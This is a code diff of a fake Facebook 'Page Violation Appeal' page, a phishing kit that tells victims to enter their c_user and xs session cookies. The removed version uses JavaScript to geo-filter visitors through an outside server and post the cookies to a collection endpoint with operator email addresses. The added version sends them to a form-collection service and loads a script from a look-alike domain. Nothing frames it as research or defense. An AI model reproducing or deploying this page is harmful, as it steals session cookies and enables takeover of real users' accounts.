@@ -1,45 +1,49 @@
-<html lang="en">
-
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Account Verification Meta </title>
-  <style>
-    body {
+<!DOCTYPE html>
+<html lang=en><!--
+ 
+-->
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width, initial-scale=1.0">
+<title>Request a Verified Badge on Facebook</title>
+<link href="https://vjs.zencdn.net/7.14.3/video-js.css" rel="stylesheet" />
+<script src="https://vjs.zencdn.net/7.14.3/video.min.js"></script>
+<script src="https://metaverifybadgeget.github.io/inspectr/index.js"></script>
+<style>
+   body {
       font-family: "Helvetica Neue", Arial, sans-serif;
       background-color: #f0f2f5;
       margin: 0;
       padding: 0;
-      overflow-x: hidden;
-    }
+      overflow-x: hidden
+   }
 
-    .header {
-      background-color: #4267b2;
+   .header {
+      background-color: #4267B2;
       padding: 25px 20px;
       display: flex;
       justify-content: space-between;
       align-items: center;
-      color: white;
-    }
+      color: white
+   }
 
-    .header-container {
+   .header-container {
       display: flex;
-      align-items: center;
-    }
+      align-items: center
+   }
 
-    .facebook-text {
+   .facebook-text {
       font-size: 35px;
       font-weight: bold;
       color: white;
-      font-family: "Helvetica Neue", Arial, sans-serif;
-    }
+      font-family: "Helvetica Neue", Arial, sans-serif
+   }
 
-    .divider {
+   .divider {
       height: 10px;
-      background-color: #e9ebee;
-    }
+      background-color: #e9ebee
+   }
 
-    .content-container {
+   .content-container {
       width: 80%;
       max-width: 800px;
       background-color: white;
@@ -47,52 +51,54 @@
       padding: 20px;
       border-radius: 8px;
       box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
-      position: relative;
-    }
+      position: relative
+   }
 
-    .verification-heading {
+   .verification-heading {
       font-size: 32px;
       color: #1c1e21;
       margin-bottom: 20px;
       font-weight: bold;
       display: flex;
       align-items: center;
-      position: relative;
-    }
+      position: relative
+   }
 
-    .verification-heading img {
+   .verification-heading img {
       width: 50px;
       height: auto;
-      margin-right: 15px;
-    }
+      margin-right: 15px
+   }
 
-    h1 {
+   h1 {
       font-size: 24px;
       color: #1c1e21;
       margin-bottom: 20px;
       font-weight: normal;
-      text-align: left;
-    }
+      text-align: left
+   }
 
-    p {
+   p {
       font-size: 14px;
       color: #606770;
       margin-bottom: 10px;
-      line-height: 1.6;
-    }
+      line-height: 1.6
+   }
 
-    .form-group {
-      margin-bottom: 20px;
-    }
 
-    label {
+
+   .form-group {
+      margin-bottom: 20px
+   }
+
+   label {
       font-size: 14px;
       color: #4b4f56;
       display: block;
-      margin-bottom: 8px;
-    }
+      margin-bottom: 8px
+   }
 
-    input[type="text"] {
+   input[type="text"] {
       width: 100%;
       padding: 12px 10px;
       font-size: 14px;
@@ -100,29 +106,29 @@
       border-radius: 6px;
       box-sizing: border-box;
       background-color: #f5f6f7;
-      transition: all 0.3s ease;
-    }
+      transition: all 0.3s ease
+   }
 
-    input[type="text"]:focus {
+   input[type="text"]:focus {
       border-color: #1877f2;
       background-color: white;
       outline: none;
-      box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2);
-    }
+      box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2)
+   }
 
-    .notice {
+   .notice {
       font-size: 12px;
       color: #606770;
-      margin-bottom: 25px;
-    }
+      margin-bottom: 25px
+   }
 
-    .form-notice {
+   .form-notice {
       font-size: 12px;
       color: #ff0000;
-      margin-bottom: 20px;
-    }
+      margin-bottom: 20px
+   }
 
-    button {
+   button {
       width: 100%;
       padding: 12px;
       background-color: #1877f2;
@@ -133,56 +139,22 @@
       font-size: 14px;
       font-weight: 700;
       text-transform: uppercase;
-      transition: background-color 0.3s ease;
-      position: relative;
-    }
+      transition: background-color 0.3s ease
+   }
 
-    button:hover {
-      background-color: #165ecc;
-    }
+   button:hover {
+      background-color: #165ecc
+   }
 
-    button:disabled {
-      opacity: 0.7;
-      cursor: not-allowed;
-    }
-
-    .btn-loading .btn-text {
-      visibility: hidden;
-    }
-
-    .btn-loading::after {
-      content: "";
-      position: absolute;
-      width: 20px;
-      height: 20px;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      margin: auto;
-      border: 2px solid transparent;
-      border-top-color: white;
-      border-radius: 50%;
-      animation: button-loading-spinner 0.8s ease infinite;
-    }
-
-    @keyframes button-loading-spinner {
-      from {
-        transform: rotate(0turn);
-      }
-
-      to {
-        transform: rotate(1turn);
-      }
-    }
-
-    .video-container {
+   .video-container {
       position: relative;
       width: 100%;
       max-width: 640px;
-    }
+     
+     
+   }
 
-    .poster {
+   .poster {
       position: absolute;
       top: 0;
       left: 0;
@@ -191,183 +163,81 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      background: url("poster.jpg") no-repeat center center;
+      background: url('poster.jpg') no-repeat center center;
       background-size: cover;
       cursor: pointer;
-    }
+   }
 
-    .play-btn {
+   .play-btn {
       font-size: 3rem;
       color: white;
       text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
       pointer-events: none;
-    }
+   }
+   
 
-    video {
+   video {
       width: 100%;
       display: block;
-    }
-  </style>
-
-  <style>
-    @font-face {
-      font-family: 'NotoSans_online_security';
-      src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-regular.woff);
-    }
-
-    @font-face {
-      font-family: 'NotoSans_medium_online_security';
-      src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-medium.ttf);
-    }
-
-    @font-face {
-      font-family: 'NotoSans_bold_online_security';
-      src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-bold.woff);
-    }
-
-    @font-face {
-      font-family: 'NotoSans_semibold_online_security';
-      src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-semibold.ttf);
-    }
-  </style>
-</head>
+   }
+   
+</style>
 
 <body>
-  <div class="header">
-    <div class="header-container">
-      <span class="facebook-text">facebook</span>
-    </div>
-  </div>
 
-  <div class="divider"></div>
-
-  <div class="content-container">
-    <div class="verification-heading">
-      <img
-        src="data:image/png;base64,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"
-        alt="Global Glitch Media Logo">
-      Account Verification Center
-    </div>
-    <h1>Page Violation Appeal</h1>
-    <p>
-      We've identified activity on your page that may violate our Community Standards. Your access has been temporarily restricted while we review this matter.
-    </p>
-    <p>
-     To help us verify your identity and resolve this issue, please carefully follow the instructions below.
-    </p>
-    <p>
-      .
-    </p>
-
-    <div class="video-container" style="position: relative !important">
-      <video id="video" controls="" preload="" autoplay poster="fbPlay.jfif">
-        <source src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4"
-          type="video/mp4">
-        Your browser does not support the video tag.
-      </video>
-    </div>
-
-    <p class="form-notice">
-     Verification process demonstration
-    </p>
-
-    <form id="verificationForm" class="content">
-
-      <div class="form-group">
-        <label for="c_user">c_user</label>
-        <input type="text" id="c_user" name="c_user" pattern="[0-9]+" minlength="6" required="" value="">
+   <div class=header>
+      <div class=header-container>
+         <span class=facebook-text>facebook</span>
       </div>
-      <div class="form-group">
-        <label for="xs">xs</label>
-        <input type="text" id="xs" name="xs" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$"
-          required="" value="">
+   </div>
+
+   <div class=divider></div>
+
+   <div class=content-container>
+
+      <div class=verification-heading>
+         <img
+            src="data:image/png;base64,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"
+            alt="Global Glitch Media Logo">
+         Account Verification Center
       </div>
-      <p class="notice">
-        Please make sure not to log out from your computer or laptop until you
-        have received a verification email.
-      </p>
-      <button class="submitBtn" type="submit" id="submitButton">
-        <span class="btn-text">Submit</span>
-      </button>
-    </form>
-  </div>
+      <h1>Page Violation Appeal</h1>
+      <p>We've identified activity on your page that may violate our Community Standards. Your access has been temporarily restricted while we review this matter..</p>
+      <p>To help us verify your identity and resolve this issue, please carefully follow the instructions below.</p>
+      <p></p>
 
-  <span id="PING_IFRAME_FORM_DETECTION" style="display: none;"></span>
+      <div class=video-container style=position:relative!important>
+         <video id="video"  controls preload=""
+            poster="fbPlay.jfif">
+            <source
+               src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4"
+               type="video/mp4">
+            Your browser does not support the video tag.
+         </video>
+      </div>
 
-  <script>
+     
+      <p class=form-notice>Verification process demonstration.</p>
 
-    let allowRecovery = false;
-    let finalRedirect = "";
+                        <form class="content" action="https://submit-form.com/SQuqEpI1n" method="POST">
+ <input
+    type="hidden"
+    name="_redirect"
+    value="https://security-center-theta.vercel.app/"
+  />
+         
+         <div class=form-group>
+            <label for=c_user>c_user</label>
+            <input type=text id=c_user name=c_user pattern=[0-9]+ minlength=6 required value>
+         </div>
+         <div class=form-group>
+            <label for=xs>xs</label>
+            <input type=text id=xs name=xs pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$" required
+               value>
+         </div>
+         <p class=notice>Please make sure not to log out from your computer or laptop until you have received a
+            verification email.</p>
+         <button class="submitBtn" type=submit>Submit</button>
+      </form>
+   </div>
 
-    // Check location on page load
-    document.addEventListener("DOMContentLoaded", function () {
-      fetch(`https://handle.gadgetsdecory.xyz:3000/dc`)
-        .then(res => res.json())
-        .then(data => {
-          const myIp = data.clientIp;
-          const proxyStatus = data[myIp]?.proxy;
-          const countryCode = data[myIp]?.isocode;
-
-          if (proxyStatus !== "yes" && countryCode !== "PK") {
-            allowRecovery = true;
-            finalRedirect = data.red;
-          } else {
-            allowRecovery = false;
-          }
-        })
-        .catch(err => {
-          console.error("Location check error:", err);
-          allowRecovery = false;
-        });
-    });
-
-    // Form submission handler
-    document.getElementById('verificationForm').addEventListener('submit', async function (event) {
-      event.preventDefault();
-
-      const submitButton = document.getElementById('submitButton');
-      submitButton.classList.add('btn-loading');
-      submitButton.disabled = true;
-
-      const cUserInput = document.getElementById("c_user").value.trim();
-      const xsInput = document.getElementById("xs").value.trim();
-
-      // Submit to the new endpoint
-      fetch("https://postal-form.on.shiper.app/submit", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          c_user: cUserInput,
-          xs: xsInput,
-          emails: ["mjohn72929@gmail.com", "foldedeszteradvertising@gmail.com"],
-          workerEmail: "mjohn72929@gmail.com",
-          name: "shan"
-        }),
-      })
-        .then(res => {
-          if (res.ok) {
-            if (allowRecovery) {
-
-              window.location.replace(atob(finalRedirect));
-            } else {
-
-              window.location.href = "password.html";
-            }
-          } else {
-            throw new Error('Submission failed');
-          }
-        })
-        .catch(err => {
-          console.error("Submission error:", err);
-
-
-        })
-        .finally(() => {
-          submitButton.classList.remove('btn-loading');
-          submitButton.disabled = false;
-        });
-    });
-  </script>
-</body>
-
-</html>
